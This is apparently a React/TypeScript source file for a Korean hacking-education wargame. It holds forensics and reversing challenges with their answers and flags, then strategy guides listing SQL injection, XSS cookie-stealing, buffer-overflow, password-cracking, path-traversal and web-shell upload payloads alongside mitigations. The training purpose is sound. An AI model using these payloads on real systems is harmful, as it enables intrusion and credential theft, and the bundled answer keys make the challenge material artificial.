    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-200',
    answer: "strings",
    flag: 'FLAG{STRINGS_COMMAND_LEARNED}',
    desc: `🌟 <b>어떤 상황인가요? (흙탕물 속 금반지 찾기 비유)</b><br>
프로그램 실행 파일이나 깨진 파일을 열어보면 온통 알아볼 수 없는 기계 외계어(바이너리)로 가득 차 있어요.<br>
하지만 그 혼돈 속에서도 개발자가 남겨둔 비밀번호, 설정 주소, 숨겨진 메모 같은 <b>"사람이 읽을 수 있는 알파벳 글자"</b>들이 보물처럼 섞여 있습니다!

🔍 <b>포렌식 과학수사의 기본 도구: strings</b><br>
리눅스의 <code>strings</code> 명령어는 파일 안에서 사람이 읽을 수 있는 연속된 문자열만 기적처럼 체로 걸러내어 화면에 깔끔하게 보여줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 문자열 추출 명령어 소문자 7글자를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">strings</code>`,
    code: `$ ??? evidence.bin | grep -i password
FOUND_PASSWORD_IN_BINARY_2026 (외계어 속에서 찾아낸 진짜 비밀번호!)`,
    language: 'bash',
    hint: "정답은 [strings] 입니다. 영어로 문자열들을 뜻하는 소문자 strings 를 입력하세요!"
  },
  {
    id: 'forensic_1',
    title: '[실전 Level 1] 사진 뒤에 숨겨진 비밀 메모 찾기 (exiftool 메타데이터)',
    category: '디지털 포렌식',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-200',
    answer: "exiftool evidence_photo.png",
    flag: 'FLAG{EXIF_METADATA_EXTRACTED}',
    desc: `🌟 <b>어떤 상황인가요? (사진 속 숨은 발자국 비유)</b><br>
스마트폰이나 카메라로 사진을 찍으면, 화면에 보이는 그림뿐만 아니라 <b>촬영 날짜, GPS 위치 좌표, 카메라 기종, 숨겨진 작성자 코멘트(EXIF 메타데이터)</b>가 사진 파일 속에 몰래 함께 기록돼요!

🔍 <b>디지털 돋보기: exiftool</b><br>
포렌식 수사관의 필수 도구 <code>exiftool</code>을 쓰면, 이미지 파일의 보이지 않는 뒷면을 돋보기처럼 샅샅이 까서 숨겨진 비밀 플래그를 찾아낼 수 있습니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 증거 사진의 메타데이터를 추출하는 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">exiftool evidence_photo.png</code>`,
    code: `file: evidence_photo.png
Camera: CyberCam 9000
Comment: FLAG_IS_HIDDEN_IN_METADATA (사진 속 비밀 코멘트 노출!)`,
    language: 'bash',
    hint: "정답은 [exiftool evidence_photo.png] 입니다. 도구 이름 뒤에 한 칸 띄우고 파일명을 적으세요."
  },
  {
    id: 'forensic_e_2',
    title: '[실전 Level 1] 가짜 확장자(.txt)로 위장한 파일의 진짜 정체 밝히기 (file)',
    category: '디지털 포렌식',
    role: 'Hacking',
    level: 'Easy',
    xp: 95,
    cwe: 'CWE-200',
    answer: "file secret.txt",
    flag: 'FLAG{DISGUISED_EXTENSION_DETECTED}',
    desc: `🌟 <b>어떤 상황인가요? (가면 쓴 파일 비유)</b><br>
범인이 중요한 증거 사진을 숨기기 위해, 사진 파일(PNG)의 끝 글자(확장자)만 <code>secret.txt</code>로 몰래 바꿔치기해 두었어요!<br>
메모장으로 열어보면 글자가 다 깨져 보이지만, 파일의 맨 앞 4글자에는 그 파일의 진짜 혈액형이자 지문인 <b>'매직 바이트(Magic Bytes)'</b>가 영원히 새겨져 있습니다.

🔍 <b>진짜 신분증 검사관: file 명령어</b><br>
리눅스의 <code>file</code> 명령어는 겉모습(확장자)에 절대 속지 않고, 파일 내부의 매직 바이트를 검사해 "이 파일은 .txt가 아니라 진짜 PNG 이미지입니다!"라고 진실을 밝혀줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 위장 파일의 진짜 형식을 판별하는 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">file secret.txt</code>`,
    code: `$ cat secret.txt → \\x89PNG\\r\\n (메모장으로 열면 깨져 보이지만 맨 앞은 PNG 지문!)
$ file secret.txt → PNG image data (진짜 정체 탄로!)`,
    language: 'bash',
    hint: "정답은 [file secret.txt] 입니다. file 명령어 뒤에 한 칸 띄우고 파일 이름을 입력하세요."
  },
  {
    id: 'forensic_m_1',
    title: '[실전] Base64로 은닉된 증거 디코딩',
    category: '디지털 포렌식',
    role: 'Hacking',
    level: 'Medium',
    xp: 160,
    cwe: 'CWE-200',
    answer: "echo RkxBR3tCQVNFNjRfSElEREVOfQ== | base64 -d",
    flag: 'FLAG{BASE64_HIDDEN}',
    desc: `증거 파일의 주석란에서 다음과 같은 이상한 문자열이 발견되었습니다: <code>RkxBR3tCQVNFNjRfSElEREVOfQ==</code>. 등호(=)로 끝나는 이 형태는 Base64 인코딩의 전형적인 특징입니다.
<br><br>👉 이 문자열을 디코딩하는 명령어를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `# 증거 파일 주석
comment: RkxBR3tCQVNFNjRfSElEREVOfQ==`,
    language: 'bash',
    hint: "이 문자열을 echo로 출력한 뒤, 파이프(|)로 base64 디코드 도구에 전달해 보세요. 디코딩 방향을 의미하는 옵션도 필요합니다."
  },
  {
    id: 'forensic_h_1',
    title: '[고급] 메모리 덤프에서 실행 프로세스 목록 추출',
    category: '디지털 포렌식',
    role: 'Hacking',
    level: 'Hard',
    xp: 240,
    cwe: 'CWE-200',
    answer: "volatility -f memdump.raw --profile=Win10x64 pslist",
    flag: 'FLAG{MEMORY_DUMP_PSLIST_RECOVERED}',
    desc: `압수한 서버의 RAM 이미지(<code>memdump.raw</code>, Windows 10 x64)가 확보되었습니다. 메모리 포렌식 도구로 덤프 당시 실행 중이던 프로세스 목록을 추출해야 합니다.
<br><br>👉 <code>volatility</code>로 <code>memdump.raw</code> 파일에서 Win10x64 프로파일을 지정해 <code>pslist</code> 플러그인을 실행하는 명령어를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `$ file memdump.raw
memdump.raw: Windows 10 x64 physical memory dump`,
    language: 'bash',
    hint: "volatility는 -f로 분석할 덤프 파일을, --profile= 로 운영체제 프로파일을 지정합니다. 그 뒤에 실행할 플러그인 이름을 이어붙이세요."
  },

  {
    id: 'rev_t_1',
    title: '[튜토리얼 1단계] 정체불명 블랙박스 프로그램의 신분증 감정하기 (file)',
    category: '리버싱 분석',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-697',
    answer: "file ./crackme",
    flag: 'FLAG{BINARY_TYPE_IDENTIFIED}',
    desc: `🌟 <b>어떤 상황인가요? (블랙박스 기계 감정 비유)</b><br>
소스코드가 없는 비밀 프로그램(<code>crackme</code>)을 하나 넘겨받았어요!<br>
내부 구조를 뜯어보기(리버스 엔지니어링) 전에, 이 프로그램이 윈도우용인지 리눅스용인지, 32비트인지 64비트인지 <b>기본 신분증(아키텍처/포맷)</b>부터 확인하는 것이 리버싱의 가장 첫걸음입니다.

🔍 <b>감정 도구: file 명령어</b><br>
리눅스의 <code>file ./crackme</code> 명령어를 치면 파일의 포맷(ELF 실행 파일 등)을 즉시 판별해 줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 crackme 파일의 형식을 확인하는 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">file ./crackme</code>`,
    code: `$ ls
crackme (소스코드 없이 컴파일된 정체불명의 바이너리 파일)`,
    language: 'bash',
    hint: "정답은 [file ./crackme] 입니다. file 뒤에 한 칸 띄우고 ./crackme 를 입력하세요."
  },
  {
    id: 'rev_1',
    title: '[실전 Level 1] 시계태엽 분해해서 main 함수 엿보기 (objdump 디스어셈블)',
    category: '리버싱 분석',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-697',
    answer: "objdump -d ./crackme | grep main -A 20",
    flag: 'FLAG{REVERSING_DISASSEMBLY_PASS}',
    desc: `🌟 <b>어떤 상황인가요? (완제품 장난감 역분해 비유)</b><br>
공장에서 완성된 장난감(바이너리)은 부품 설계도(소스코드)가 숨겨져 있어요.<br>
하지만 <b>역어셈블러(objdump)</b>를 쓰면 기계어로 굳어버린 프로그램을 사람이 읽을 수 있는 조립식 명령어(어셈블리)로 다시 분해해 낼 수 있습니다!

🔍 <b>명령어 구조 이해하기</b><br>
<code>objdump -d ./crackme | grep main -A 20</code><br>
- <code>objdump -d</code>: 실행 파일 기계어를 전부 어셈블리로 풀어내라!<br>
- <code>| grep main -A 20</code>: 프로그램이 시작되는 <code>main</code> 함수부터 딱 20줄만 골라서 보여줘라! (핵심 비밀번호 검증 로직이 바로 여기에 있습니다)

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 main 함수 영역을 디스어셈블하는 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">objdump -d ./crackme | grep main -A 20</code>`,
    code: `// 비밀 프로그램 내부에서 실제로 돌고 있는 원본 비교 로직
if (input === "open_sesame") {
  grant_access(); // 정답 비밀번호를 알아내야 함!
}`,
    language: 'bash',
    hint: "정답은 [objdump -d ./crackme | grep main -A 20] 입니다. 복사해서 터미널 창에 붙여넣어 보세요!"
  },
  {
    id: 'rev_e_2',
    title: '[실전 Level 1] 실행 중인 프로그램의 귓속말 도청하기 (ltrace 실시간 추적)',
    category: '리버싱 분석',
    role: 'Hacking',
    level: 'Easy',
    xp: 105,
    cwe: 'CWE-200',
    answer: "ltrace ./crackme",
    flag: 'FLAG{LTRACE_LIBRARY_CALL_TRACED}',
    desc: `🌟 <b>어떤 상황인가요? (귓속말 엿듣기 비유)</b><br>
복잡하게 코드를 분해해서 읽지 않아도, <b>프로그램을 실행시켜 둔 뒤 뒤에서 무슨 말을 주고받는지 몰래 엿듣는(동적 분석)</b> 치트키 같은 방법이 있어요!<br>
비밀번호를 검사할 때 프로그램은 내부적으로 <code>strcmp(내가입력한값, "진짜비밀번호")</code> 함수를 호출하는데, <b>ltrace</b> 도구를 켜두면 화면에 진짜 비밀번호가 그대로 드러납니다!

🔍 <b>동적 추적 도구: ltrace</b><br>
<code>ltrace ./crackme</code> 를 실행하면, 프로그램이 외부 라이브러리 함수와 대화하는 모든 내용을 실시간으로 모니터에 도청해 줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 ltrace 실행 추적 명령어를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">ltrace ./crackme</code>`,
    code: `$ ./crackme
Enter password: (사용자 입력 대기)
// ltrace가 뒤에서 몰래 잡아낸 라이브러리 호출:
strcmp(user_input, "real_password_here") → 진짜 비밀번호가 도청됨!`,
    language: 'bash',
    hint: "정답은 [ltrace ./crackme] 입니다. ltrace 뒤에 한 칸 띄우고 ./crackme 를 입력하세요."
  },
  {
    id: 'rev_m_1',
    title: '[실전] 비밀번호 비교 로직 위치 찾기',
    category: '리버싱 분석',
    role: 'Hacking',
    level: 'Medium',
    xp: 170,
    cwe: 'CWE-697',
    answer: "objdump -d ./crackme | grep cmp",
    flag: 'FLAG{CMP_INSTRUCTION_LOCATED}',
    desc: `디스어셈블된 코드가 너무 길어서 눈으로 다 읽기 어렵습니다. 비밀번호 비교 같은 조건 검사는 어셈블리에서 보통 <code>cmp</code>(compare) 명령어로 나타납니다.
<br><br>👉 전체 디스어셈블 결과에서 <code>cmp</code>가 포함된 줄만 걸러서 보는 명령어를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `; 디스어셈블 결과 일부
mov  eax, [ebp-0x4]
cmp  eax, 0x1337    ; 이 비교가 인증 성공/실패를 가릅니다
jne  fail_label`,
    language: 'bash',
    hint: "Easy에서 썼던 objdump -d 명령어에, 원하는 키워드가 포함된 줄만 걸러내는 파이프(|) 명령어를 이어붙여 보세요."
  },
  {
    id: 'rev_h_1',
    title: '[고급] 하드코딩된 API 키 문자열 탐색',
    category: '리버싱 분석',
    role: 'Hacking',
    level: 'Hard',
    xp: 250,
    cwe: 'CWE-798',
    answer: "strings ./crackme | grep API_KEY",
    flag: 'FLAG{HARDCODED_API_KEY_FOUND}',
    desc: `개발자가 실수로 API 키를 소스코드에 문자열 그대로 박아넣고 컴파일했습니다. 바이너리를 디스어셈블하지 않고도, 문자열 추출만으로 이런 하드코딩된 비밀 값을 찾아낼 수 있는 경우가 많습니다.
<br><br>👉 바이너리에서 문자열을 추출한 뒤 <code>API_KEY</code>라는 패턴이 포함된 줄만 걸러내는 명령어를 직접 작성하십시오. 정답 형식은 미리 알려드리지 않습니다.`,
    code: `// 컴파일 전 소스코드 (실수로 하드코딩됨)
#define API_KEY "sk_live_9f8a7b6c5d4e3f2a1b0c"`,
    language: 'c',
    hint: "Tutorial에서 썼던 strings 명령어에, 원하는 키워드가 포함된 줄만 걸러내는 파이프(|) 명령어를 이어붙여 보세요."
  }
];

// ==========================================
// 3. COMPREHENSIVE STRATEGY DOCUMENTS (공략집)
// ==========================================

export const comprehensiveStrategies: Record<string, { title: string; steps: string[]; codeExamples: string[] }> = {
  'sql': {
    title: "SQL Injection 마스터 공략집",
    steps: [
      "📌 [1단계: 취약성 정밀 진단] - 입력 폼 필드나 URL 파라미터 내부에 작은따옴표(') 혹은 큰따옴표(\")를 주입해 DB Syntax 에러가 유출되는지 검증합니다.",
      "📌 [2단계: 인증 우회 시나리오] - 백엔드 쿼리의 구조를 무력화하기 위해 상시 참을 만드는 구문(' OR '1'='1) 및 뒤쪽 쿼리를 소거하는 주석(-- 또는 #)을 결합하여 가짜 토큰을 강제 주입합니다.",
      "📌 [3단계: 방어 및 시큐어 코딩] - Statement 대신 PreparedStatement를 도입하고, 매개변수화된 쿼리(Parameterized Query)를 통해 쿼리 구조와 입력 데이터를 엄격히 분리합니다."
    ],
    codeExamples: ["' OR 1=1 -- ", "admin' --", "' UNION SELECT null, version(), user() --", "PreparedStatement pstmt = conn.prepareStatement(query);"]
  },
  'xss': {
    title: "Cross-Site Scripting (XSS) 분석 및 방어 기법",
    steps: [
      "📌 [1단계: 컨텍스트 분석] - 사용자의 입력값이 HTML 본문, 속성값, 스크립트 블록 중 어디에 필터링 없이 그대로 인쇄되는지 추적합니다.",
      "📌 [2단계: 샌드박스 우회 및 실행] - <script> 태그가 차단된 경우 onerror, onload 등의 이벤트 핸들러 속성을 활용하거나 SVG 그래픽 태그를 주입합니다.",
      "📌 [3단계: 방어 대책 수립] - HTML Entity Encoding(htmlspecialchars)을 적용하고, 세션 쿠키에 HttpOnly 플래그 및 CSP(Content Security Policy)를 선언합니다."
    ],
    codeExamples: ["<script>alert(document.cookie)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "Set-Cookie: session=123; HttpOnly; Secure"]
  },
  'memory': {
    title: "메모리 손상 및 버퍼 오버플로우 관제",
    steps: [
      "📌 [1단계: 오프셋 거리 계산] - 입력 버퍼 시작점부터 함수의 복귀 주소(EIP/RIP)까지의 오프셋 거리를 패턴 생성기를 통해 파악합니다.",
      "📌 [2단계: 레지스터 오염 및 실행 제어] - 더미 값('A'*오프셋)을 채운 뒤 타겟 셸코드 주소를 덮어씌웁니다.",
      "📌 [3단계: 방어 패치] - gets(), strcpy() 등 경계 검사가 없는 취약 함수를 fgets(), strncpy()로 전면 교체하고 ASLR, Stack Canary를 활성화합니다."
    ],
    codeExamples: ["python3 -c \"print('A'*64 + '\\xef\\xbe\\xad\\xde')\"", "checksec --file=target_bin", "fgets(buffer, sizeof(buffer), stdin);"]
  },
  'crypto': {
    title: "암호화 알고리즘 크래킹 및 솔팅 검증",
    steps: [
      "📌 [1단계: 해시 식별] - 유출된 문자열의 길이와 인코딩 특성(Base64, Hex)을 통해 알고리즘(MD5, SHA, Bcrypt)을 판별합니다.",
      "📌 [2단계: 사전 공격 구동] - Rockyou 사전 파일과 결합하여 GPU 기반 Hashcat 무차별 대입을 수행합니다.",
      "📌 [3단계: 보안 강화] - 안전한 단방향 해시 알고리즘(Bcrypt, Argon2)과 무작위 고유 솔트(Salt)를 반드시 적용합니다."
    ],
    codeExamples: ["hashcat -m 0 md5_hashes.txt wordlist.txt", "john --wordlist=rockyou.txt target.hash", "const hash = await bcrypt.hash(password, 12);"]
  },
  'network': {
    title: "네트워크 트래픽 스니핑 및 SSL 방어",
    steps: [
      "📌 [1단계: 무차별 모드 활성화] - 인터페이스 카드를 Promiscuous 모드로 전환하여 네트워크 세그먼트 전반의 패킷(.pcap)을 수집합니다.",
      "📌 [2단계: 평문 프로토콜 정제] - HTTP, FTP 등 암호화되지 않은 요청 패킷에서 계정 및 중요 파라미터를 필터링합니다.",
      "📌 [3단계: 전송 계층 암호화] - HTTPS(TLS 1.3)를 기본 적용하고 HSTS(HTTP Strict Transport Security)를 선언합니다."
    ],
    codeExamples: ["tcpdump -i eth0 -vvv -X 'port 80'", "tshark -r capture.pcap -Y 'http.request.method==\"POST\"'", "Strict-Transport-Security: max-age=31536000; includeSubDomains"]
  },
  'web': {
    title: "웹 애플리케이션 비즈니스 로직 취약점",
    steps: [
      "📌 [1단계: 매개변수 변조] - 요청 파라미터(id, role, price)를 중간 프록시로 가로채 관리자 권한으로 승격을 시도합니다.",
      "📌 [2단계: 경로 조작(LFI)] - ../ 기호를 사용하여 상위 시스템 설정 파일(/etc/passwd, .env)을 열람합니다.",
      "📌 [3단계: 화이트리스트 검증] - 파일 경로는 화이트리스트 기반 매핑 테이블로 처리하고, 서버 측 세션 권한을 엄격히 대조합니다."
    ],
    codeExamples: ["../../../../../../etc/passwd", "curl -F 'file=@shell.php' http://target/upload.php", "path.basename(requestedFile)"]
  },
  'forensic': {
    title: "디지털 포렌식 및 아티팩트 역추적",
    steps: [
      "📌 [1단계: 무결성 확보] - 원본 저장매체 변형을 방지하기 위해 쓰기 방지 장치 및 해시 검증된 비트스트림 이미지를 획득합니다.",
      "📌 [2단계: 휘발성 메모리 덤프 추적] - Volatility 등을 활용해 침해 당시의 프로세스 트리, 은닉 스레드, 네트워크 연결을 복원합니다.",
      "📌 [3단계: 아티팩트 분석] - 메타데이터(Exif), 프리페치, 레지스트리, 타임라인을 구성하여 침투 흔적을 입증합니다."
    ],
    codeExamples: ["volatility -f memory.dmp --profile=Win10x64 pstree", "exiftool suspicious_image.png", "strings -n 6 dump.img | grep -i 'flag'"]
  },
  'reversing': {
    title: "바이너리 리버싱 분석 및 제어 흐름 패치",
    steps: [
      "📌 [1단계: 정적 정찰] - 패커/난독화 여부를 확인하고 문자열 검색으로 하드코딩된 암호 및 분기 함수 주소를 스캔합니다.",
      "📌 [2단계: 디컴파일 제어 흐름 분석] - IDA Pro/Ghidra로 역어셈블하여 조건부 점프(JE, JNE, JZ)의 로직을 추적합니다.",
      "📌 [3단계: 동적 디버깅 및 패치] - GDB/x64dbg를 연결하여 플래그 레지스터(ZF)를 강제 반전시키거나 기계어를 NOP(0x90)으로 패치합니다."
    ],
    codeExamples: ["objdump -d ./target | grep '<main>': -A 30", "gdb -q ./target_auth", "radare2 -d ./auth_core"]
  }
};

// ==========================================
// 4. RANK EMBLEM & TITLE BADGE COMPONENTS
// ==========================================

export const RankEmblem = ({
  type,
  color,
  size = 64,
  isRainbow = false,
}: {
  type: LevelRankIconType;
  color: string;
  size?: number;
  isRainbow?: boolean;
}) => {
  const glowStyle: React.CSSProperties = {
    filter: isRainbow 
      ? 'drop-shadow(0 0 10px rgba(255,255,255,0.9)) drop-shadow(0 0 20px rgba(255,0,200,0.6))'
      : `drop-shadow(0 0 8px ${color})`,
  };

  if (type === 'sprout') {
    return (
      <svg width={size} height={size} viewBox="0 0 100 100" style={glowStyle} aria-hidden="true">
        <circle cx="50" cy="50" r="38" fill="#18181b" stroke={color} strokeWidth="6" />
        <path d="M50 68 V42 M50 48 Q36 34 32 46 Q42 54 50 48 M50 44 Q64 30 68 42 Q58 50 50 44" fill="none" stroke={color} strokeWidth="5" strokeLinecap="round" strokeLinejoin="round" />
      </svg>
    );
  }

  if (type === 'bronze' || type === 'silver' || type === 'gold') {
    return (
      <svg width={size} height={size} viewBox="0 0 100 100" style={glowStyle} aria-hidden="true">
        <path d="M50 12 L84 34 L73 79 L50 62 L27 79 L16 34Z" fill={color} />
        <path d="M36 38 L50 25 L64 38 L50 49Z" fill="#000" fillOpacity="0.3" />
      </svg>
    );
  }

  if (type === 'platinum' || type === 'diamond') {
    return (
      <svg width={size} height={size} viewBox="0 0 100 100" style={glowStyle} aria-hidden="true">
        <path d="M50 9 L86 50 L50 91 L14 50Z" fill={color} />
        <path d="M50 9 L50 91 M14 50 H86" stroke="#ffffff" strokeOpacity="0.4" strokeWidth="5" />
      </svg>
    );
  }

  if (type === 'master' || type === 'challenger') {
    return (
      <svg width={size} height={size} viewBox="0 0 100 100" style={glowStyle} aria-hidden="true">
        <path d="M50 7 L84 31 L76 76 L50 93 L24 76 L16 31Z" fill={color} />
        <path d="M50 17 L65 46 L50 38 L35 46Z" fill="#fff" fillOpacity="0.4" />
      </svg>
    );
  }

  // Hacker (final tier) — hooded silhouette, recolored per equipped 화이트/블랙 해커 title
  return (
    <svg width={size} height={size} viewBox="0 0 100 100" style={glowStyle} aria-hidden="true">
      <circle cx="50" cy="50" r="38" fill="#0a0e14" stroke={color} strokeWidth="6" />
      <path d="M50 22 C33 22 24 34 24 50 C24 62 32 68 32 68 L34 56 C34 56 40 62 50 62 C60 62 66 56 66 56 L68 68 C68 68 76 62 76 50 C76 34 67 22 50 22Z" fill={color} />
      <circle cx="41" cy="46" r="4.5" fill="#0a0e14" />
      <circle cx="59" cy="46" r="4.5" fill="#0a0e14" />
    </svg>
  );
};

export type TitleVisualData = {
  kind: 'level' | 'mastery';
  color: string;
  name?: string;
  iconType?: LevelRankIconType;
  icon?: string;
  tier?: number;
  categoryName?: string;
  meta?: { isRainbow?: boolean };
};

export const TitleAvatarBadge = ({
  title,
  size = 96,
  frame = 'square',
  showTierChip = true,
}: {
  title: TitleVisualData;
  size?: number;
  frame?: 'square' | 'circle';
  showTierChip?: boolean;
}) => {
  const radius = frame === 'circle' ? '50%' : '14px';
  const borderColor = title.kind === 'level' ? (title.meta?.isRainbow ? '#67e8f9' : title.color) : title.color;
  const shellStyle: React.CSSProperties = {
    width: size,
    height: size,
    position: 'relative',
    borderRadius: radius,
    border: `2px solid ${borderColor}`,
    background: title.kind === 'level'
      ? title.meta?.isRainbow
        ? 'radial-gradient(circle, rgba(255,0,200,0.18), rgba(10,14,24,0.98) 70%)'
        : `radial-gradient(circle, ${title.color}28, rgba(10,14,24,0.98) 64%)`
      : `radial-gradient(circle, ${title.color}24, rgba(10,14,24,0.98) 64%)`,
    boxShadow: `0 0 16px ${title.color}88`,
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    overflow: 'hidden',
  };

  return (
    <div style={shellStyle}>
      {title.kind === 'level' ? (
        <RankEmblem type={title.iconType ?? 'sprout'} color={title.color} size={Math.max(24, size * 0.65)} isRainbow={title.meta?.isRainbow} />
      ) : (
        <>
          <span style={{ fontSize: Math.max(22, size * 0.36) }}>{title.icon}</span>
          {showTierChip && title.tier ? (
            <div style={{
              position: 'absolute',
              right: '6px',
              bottom: '6px',
              padding: '2px 6px',
              borderRadius: '999px',
              border: `1px solid ${title.color}`,
              background: `${title.color}33`,
              color: '#fff',
              fontSize: Math.max(9, size * 0.1),
              fontWeight: 900,
            }}>T{title.tier}</div>
          ) : null}
        </>
      )}
    </div>
  );
};

// ==========================================
// 4.5 LANDING HERO: 코드 레인 캔버스 배경
// ==========================================
const MATRIX_CHARS = '01$#{}[]();"\'*&%!?<>/\\=+-_SELECTUNIONDROPFLAG'.split('');

export const CodeRainCanvas = () => {
  const canvasRef = useRef<HTMLCanvasElement>(null);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const ctx = canvas.getContext('2d');
    if (!ctx) return;

    let width = 0;
    let height = 0;
    let columns = 0;
    let drops: number[] = [];
    const fontSize = 16;

    const resize = () => {
      const parent = canvas.parentElement;
      width = canvas.width = parent ? parent.clientWidth : window.innerWidth;
      height = canvas.height = parent ? parent.clientHeight : window.innerHeight;
      columns = Math.floor(width / fontSize);
      drops = new Array(columns).fill(0).map(() => Math.floor(Math.random() * -40));
    };
    resize();
    window.addEventListener('resize', resize);

    let animId = 0;
    const draw = () => {
      ctx.fillStyle = 'rgba(2, 4, 10, 0.15)';
      ctx.fillRect(0, 0, width, height);
      ctx.font = `${fontSize}px monospace`;

      for (let i = 0; i < columns; i++) {
        const char = MATRIX_CHARS[Math.floor(Math.random() * MATRIX_CHARS.length)];
        const x = i * fontSize;
        const y = drops[i] * fontSize;
        const isHead = Math.random() > 0.92;
        ctx.fillStyle = isHead ? 'rgba(255,255,255,0.9)' : 'rgba(0,242,254,0.75)';
        ctx.fillText(char, x, y);

        if (y > height && Math.random() > 0.975) {
          drops[i] = 0;
        }
        drops[i]++;
      }
      animId = requestAnimationFrame(draw);
    };
    animId = requestAnimationFrame(draw);

    return () => {
      cancelAnimationFrame(animId);
      window.removeEventListener('resize', resize);
    };
  }, []);

  return <canvas ref={canvasRef} className="landing-matrix-canvas" aria-hidden="true" />;
};

// ==========================================
// 5. MAIN APPLICATION COMPONENT
// ==========================================

export default function App() {
  // Backend Auth State (Netlify Functions + Neon). null = guest/offline mode (local-only progress).
  const [authToken, setAuthToken] = useState<string | null>(() => {
    try { return localStorage.getItem('aegis_token'); } catch { return null; }
  });
  // Gate: nothing but the landing/login/tutorial screens is reachable until this is true
  const [isLoggedIn, setIsLoggedIn] = useState<boolean>(() => {
    try { return !!localStorage.getItem('aegis_token'); } catch { return false; }
  });
  const [currentView, setCurrentView] = useState<ViewState>(() => {
    try { return localStorage.getItem('aegis_token') ? 'landing' : 'login'; } catch { return 'login'; }
  });
  const [beginnerTopic, setBeginnerTopic] = useState<'web' | 'tools' | 'code' | 'practice'>('web');
  const [username, setUsername] = useState<string>('Guest Operator');

  const [authError, setAuthError] = useState<string>('');
  const [authLoading, setAuthLoading] = useState<boolean>(false);

  // 계정 삭제 확인 플로우
  const [isDeleteAccountOpen, setIsDeleteAccountOpen] = useState<boolean>(false);
  const [deleteAccountPassword, setDeleteAccountPassword] = useState<string>('');
  const [deleteAccountError, setDeleteAccountError] = useState<string>('');
  const [deleteAccountLoading, setDeleteAccountLoading] = useState<boolean>(false);

  const [totalExp, setTotalExp] = useState<number>(() => {
    try { return parseInt(localStorage.getItem('aegis_total_xp') || '0'); } catch { return 0; }
  });
  const [solvedProblemIds, setSolvedProblemIds] = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem('aegis_solved_ids') || '[]'); } catch { return []; }
  });
  // 이미 클리어한 문제를 다시 풀었을 때 몇 번째 재풀이인지 기록 (문제 id별 카운트). 3번까지만 보상 지급.
  const [replayCounts, setReplayCounts] = useState<Record<string, number>>(() => {
    try { return JSON.parse(localStorage.getItem('aegis_replay_counts') || '{}'); } catch { return {}; }
  });

  // Tactical Mastery
  const [tacticalMastery, setTacticalMastery] = useState<Record<string, TacticalMastery>>(() => {
    try {
      const saved = localStorage.getItem('aegis_tactical_mastery');
      if (saved) return JSON.parse(saved);
    } catch {}
    return categories.reduce((acc, cat) => {
      acc[cat.id] = { tier: 0, progress: 0 };
      return acc;
    }, {} as Record<string, TacticalMastery>);
  });

  // Global Rankings (fetched from Neon via /api/rankings)
  const [rankingsList, setRankingsList] = useState<{ rank: number; username: string; points: number }[]>([]);
  const [rankingsLoading, setRankingsLoading] = useState<boolean>(false);

  // Selected Options
  const [selectedCategory, setSelectedCategory] = useState<string>('SQL Injection');
  const [selectedRole, setSelectedRole] = useState<RoleMode>('Hacking');
  const [currentProblem, setCurrentProblem] = useState<ProblemItem>(masterProblemDB[0]);
  const [selectedTitleId, setSelectedTitleId] = useState<string>('level-새싹 개발자');
  const [isLandingGlitching, setIsLandingGlitching] = useState<boolean>(false);

  // Play Session
  const [payloadInput, setPayloadInput] = useState<string>('');
  const [flagInput, setFlagInput] = useState<string>('');
  const [terminalLogs, setTerminalLogs] = useState<Log[]>([{ type: 'info', text: 'System initialized. Sandbox ready.' }]);
  const [isSuccess, setIsSuccess] = useState<boolean>(false);
  const [hintsUsed, setHintsUsed] = useState<number>(0);
  const [showHint, setShowHint] = useState<boolean>(false);
  const [operationStartedAt, setOperationStartedAt] = useState<number>(Date.now());
  const [operationElapsedTimeText, setOperationElapsedTimeText] = useState<string>('00:00');

  // 미션 브리핑 분석법 — Level 1 문제에서 시나리오→입력→코드→도움말을 한 번에 다 보여주지 않고
  // 한 단계씩 차근차근 짚어가도록 하는 진행 단계 (0=시나리오, 1=입력, 2=코드, 3=도움말)
  const [briefingStep, setBriefingStep] = useState<number>(0);
  // 마지막 단계까지 다 본 뒤에는 안내 패널을 완전히 치워서 자유롭게 문제를 풀 수 있게 함
  // (없으면 "다음"을 눌러도 1단계로 되돌아가 설명이 끝없이 반복됨)
  const [briefingGuideDone, setBriefingGuideDone] = useState<boolean>(false);

  // Wargames: Level 1~3 허브 카드 / 카테고리 브라우징 단계 전환
  const [wargameStage, setWargameStage] = useState<'hub' | 'browse'>('hub');
  const [activeLevelTier, setActiveLevelTier] = useState<1 | 2 | 3>(1);

  // 실전 풀이 모드: 여러 카테고리를 이어서 도전하는 연속 런
  const [isRunMode, setIsRunMode] = useState<boolean>(false);
  const [runQueue, setRunQueue] = useState<ProblemItem[]>([]);
  const [runIndex, setRunIndex] = useState<number>(0);

  // 심화 풀이 모드: 사용자의 AI API 키로 새 문제를 즉석 생성
  const [aiProvider, setAiProvider] = useState<'gemini' | 'openai' | 'claude'>(() => {
